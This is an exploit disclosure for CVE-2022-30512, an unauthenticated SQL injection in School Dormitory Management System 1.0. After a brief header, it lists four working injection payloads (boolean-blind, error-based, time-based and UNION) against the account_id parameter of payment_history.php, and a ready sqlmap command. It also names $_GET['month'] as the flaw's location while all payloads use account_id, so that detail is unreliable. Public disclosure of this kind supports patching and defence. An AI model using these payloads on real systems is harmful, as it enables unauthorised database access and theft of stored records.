# CVE-2022-30512
School Dormitory Management System 1.0 - Unauthenticated SQL Injection

#### Exploit Title: School Dormitory Management System 1.0 - Unauthenticated SQL Injection
#### Date: 2022-05-25
#### CVE: CVE-2022-30512
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://www.sourcecodester.com/
#### Software Link: https://www.sourcecodester.com/php/15319/school-dormitory-management-system-phpoop-free-source-code.html
#### Version: 1.0
#### Tested on: LAMP, Ubuntu

-----
[#] Vulnerability Location:
	`$_GET['month']` in `/dms/admin/accounts/payment_history.php:31`

>
    Parameter: account_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: account_id=2' AND 6703=6703 AND 'jmUS'='jmUS
>
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: account_id=2' AND (SELECT 7343 FROM(SELECT COUNT(*),CONCAT(0x71716b7671,(SELECT (ELT(7343=7343,1))),0x7170626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'htiO'='htiO
>
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: account_id=2' AND (SELECT 2865 FROM (SELECT(SLEEP(5)))hWAb) AND 'pbGX'='pbGX
>
    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: account_id=2' UNION ALL SELECT CONCAT(0x71716b7671,0x6458467273575152444c465a7a5276684f74756c7a754b6d506a6c437a5a516479574d5844694b78,0x7170626a71),NULL,NULL,NULL,NULL,NULL,NULL-- -

---

[#] Exploitation Using SQLMAP:
	`sqlmap -u "http://localhost/dms/admin/accounts/payment_history.php?account_id=2" --dbms=mysql`
